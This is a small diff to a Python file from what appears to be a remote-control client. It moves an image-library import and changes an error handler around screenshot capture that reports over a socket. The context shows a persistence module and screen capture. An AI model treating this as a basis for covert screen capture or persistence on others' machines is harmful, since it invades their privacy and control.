@@ -11,13 +11,12 @@ import subprocess
 import sys
 from io import BytesIO, StringIO
 
-from PIL import Image
-
 from src import helper, errors
 from src.definitions import platforms
 
 if platforms.OS == platforms.LINUX:
     import Xlib
+    from PIL import Image
 
 if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
@@ -106,8 +105,8 @@ class Control(metaclass=abc.ABCMeta):
                 image = Image.frombuffer("RGB", (w, h), raw_byt.data, "raw", "BGRX")
 
                 dsp.close()
-            except:
-                self.socket.send_json(ERROR)
+            except Exception as e:
+                self.socket.send_json(ERROR, e)
                 return
         else:
             image = pyscreeze.screenshot()
